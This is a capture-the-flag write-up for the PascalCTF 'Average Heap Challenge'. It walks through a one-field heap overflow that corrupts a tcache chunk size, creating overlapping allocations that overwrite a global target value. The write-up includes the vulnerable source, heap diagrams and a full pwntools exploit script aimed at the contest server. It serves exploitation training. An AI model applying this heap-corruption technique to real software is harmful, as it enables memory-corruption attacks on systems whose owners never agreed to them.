---
title: "AHC - Average Heap Challenge"
summary: "Tcache bin confusion via chunk size corruption."
date: 2026-02-01
topics: ["pwn"]
ctfs: ["pascal-26"]
tags: ["heap", "tcache", "chunk-size-corruption"]
difficulty: hard
draft: false
---

> I believe I'm not that good at math at this point...

```sh
nc ahc.ctf.pascalctf.it 9003
```

---

A player management system with create, delete, and print operations. The goal: overwrite a global `target` variable from `0xbabebabebabebabe` to `0xdeadbeefcafebabe`.

```
Protections:
    Full RELRO
    Stack Canary
    NX enabled
    PIE enabled
```

Full protections, so we need a heap attack.

---

## Setup

The binary pre-allocates 5 chunks of size 0x48 (fitting in 0x50 tcache bin), frees them all, then allocates `target`:

```c
void setup_chall() {
    for (int i = 0; i < 5; i++)
        players[i] = malloc(0x48);

    for (int i = 4; i >= 0; i--) {
        free(players[i]);
        players[i] = 0;
    }

    target = malloc(8);
    *target = 0xbabebabebabebabe;
}
```

After setup, the heap looks like:

```
[chunk0:0x50][chunk1:0x50][chunk2:0x50][chunk3:0x50][chunk4:0x50][target:0x20][top]
     └──────────────────── tcache[0x50] ────────────────────────┘
```

The 5 freed chunks are in tcache, and `target` sits right after them.

---

## The vulnerability

Creating a player allocates `extra + 0x48` bytes, reads a name, then reads a message:

```c
void create_player() {
    int extra = read_int(0, 0x20);  // 0-32
    void *chunk = malloc(extra + 0x48);

    int name_len = read_name(chunk, extra);  // max length: extra + 39

    if (name_len <= extra + 0x1f)
        name_len = extra + 0x20;

    read_message(chunk + name_len);  // message written at offset name_len
}
```

The bug: with `extra=0`, the chunk is 0x48 bytes. If we use a max-length name (39 chars), `name_len` becomes 40 (0x28). The message starts at offset 0x28, leaving only `0x48 - 0x28 = 0x20` (32) bytes before we overflow into the next chunk's metadata.

The message can be up to 39 bytes, so we can overflow by 7 bytes into the adjacent chunk's size field.

---

## The attack

### Tcache bin confusion

The idea: corrupt a chunk's size field so when it's freed, it goes into the wrong tcache bin. Then reallocate it as a larger chunk that overlaps with `target`.

### Step by step

**1. Consume tcache entries**

```python
for i in range(3):
    create(i, 0, b'A', b'B')
```

Takes chunks 0-2 from tcache[0x50]:

```
Heap:
┌─────────┬─────────┬─────────┬─────────┬─────────┬─────────┐
│ chunk0  │ chunk1  │ chunk2  │ chunk3  │ chunk4  │ target  │
│ (used)  │ (used)  │ (used)  │ (free)  │ (free)  │ 0xbabe..│
└─────────┴─────────┴─────────┴─────────┴─────────┴─────────┘
                               └── tcache[0x50] ──┘
```

**2. Corrupt chunk4's size**

```python
create(3, 0, b'A'*39, b'B'*32 + p32(0x71))
```

Gets chunk3 from tcache. With a 39-byte name, message starts at offset 0x28. We write 32 'B's (fills the remaining 0x20 bytes) plus `p32(0x71)` which overflows into chunk4's header:

```
chunk3 layout (0x50 total, 0x48 user data):
┌──────────────────────────────────────────────────┬─────────────────┐
│                    chunk3 user data              │  chunk4 header  │
├───────────────────────┬──────────────────────────┼────────┬────────┤
│ name (39 'A's + null) │ message (32 'B's + 0x71) │prevsize│  size  │
│       offset 0x00     │       offset 0x28        │        │= 0x71! │
└───────────────────────┴──────────────────────────┴────────┴────────┘
                                            overflow ───────────────┘
```

chunk4's size field is now 0x71 instead of 0x51.

**3. Allocate chunk4 normally**

```python
create(4, 0, b'A', b'B')
```

Gets chunk4 from tcache. Tcache doesn't validate size during allocation, so this works fine.

```
Heap:
┌─────────┬─────────┬─────────┬─────────┬─────────┬─────────┐
│ chunk0  │ chunk1  │ chunk2  │ chunk3  │ chunk4  │ target  │
│ (used)  │ (used)  │ (used)  │ (used)  │ (used)  │ 0xbabe..│
│         │         │         │         │ size=71!│         │
└─────────┴─────────┴─────────┴─────────┴─────────┴─────────┘

tcache[0x50]: empty
tcache[0x70]: empty
```

**4. Free chunk4 into wrong bin**

```python
delete(4)
```

When freeing, glibc reads the chunk's size field to determine which bin. chunk4 has size 0x71, so it goes to tcache[0x70]:

```
Heap:
┌─────────┬─────────┬─────────┬─────────┬─────────┬─────────┐
│ chunk0  │ chunk1  │ chunk2  │ chunk3  │ chunk4  │ target  │
│ (used)  │ (used)  │ (used)  │ (used)  │ (free)  │ 0xbabe..│
│         │         │         │         │ size=71 │         │
└─────────┴─────────┴─────────┴─────────┴─────────┴─────────┘

tcache[0x50]: empty
tcache[0x70]: chunk4  ← wrong bin!
```

**5. Reallocate as larger chunk**

```python
create(4, 32, b'A', p64(0xdeadbeefcafebabe)*4)
```

With `extra=32`, we request `32 + 0x48 = 0x68` bytes, which needs a 0x70 chunk. malloc returns chunk4 from tcache[0x70].

The program thinks chunk4 is 0x70 bytes, but it's still at its original position. This "larger" view extends into target's memory:

```
What the program thinks chunk4 looks like:
┌────────────────────────────────────────────────────────────────────┐
│                    chunk4 as 0x70 chunk                            │
│                         (0x60 user data)                           │
├───────────────────────┬────────────────────────────────────────────┤
│ name (short)          │ message written here...                    │
│                       │                    ...overwrites target!   │
└───────────────────────┴────────────────────────────────────────────┘

Actual memory layout:
┌─────────────────────────────────────┬─────────────────────────────┐
│        real chunk4 (0x50)           │     target chunk (0x20)     │
├─────────────────────────────────────┼──────────┬──────────────────┤
│         user data                   │ metadata │ *target value    │
│                                     │          │← overwritten!    │
└─────────────────────────────────────┴──────────┴──────────────────┘
```

The message payload `p64(0xdeadbeefcafebabe)*4` (32 bytes) overwrites target's value.

**6. Win**

```python
check_target()
```

`*target` is now `0xdeadbeefcafebabe`. Flag!

---

## Solve

```python
from pwn import *

context.binary = bin = ELF('./average', checksec=False)

io = remote('ahc.ctf.pascalctf.it', 9003)
# io = process([bin.path])

def create(idx, extra, name, msg):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b': ', str(idx).encode())
    io.sendlineafter(b'? ', str(extra).encode())
    io.sendlineafter(b': ', name)
    io.sendlineafter(b': ', msg)

def delete(idx):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b': ', str(idx).encode())

def check():
    io.sendlineafter(b'> ', b'5')

# Consume tcache[0x50] entries
for i in range(3):
    create(i, 0, b'A', b'B')

# Overflow from chunk3 to corrupt chunk4's size (0x51 -> 0x71)
create(3, 0, b'A'*39, b'B'*32 + p32(0x71))

# Allocate chunk4 (corrupted size)
create(4, 0, b'A', b'B')

# Free chunk4 -> goes to tcache[0x70]
delete(4)

# Reallocate as 0x70 chunk, message overwrites target
create(4, 32, b'A', p64(0xdeadbeefcafebabe)*4)

check()
io.interactive()
```

<!-- --- -->

<!-- ## Flag -->

<!-- ``` -->
<!-- pascalCTF{wh0_kn3w_m4th_c0uld_b3_s0_d4ng3r0us} -->
<!-- ``` -->
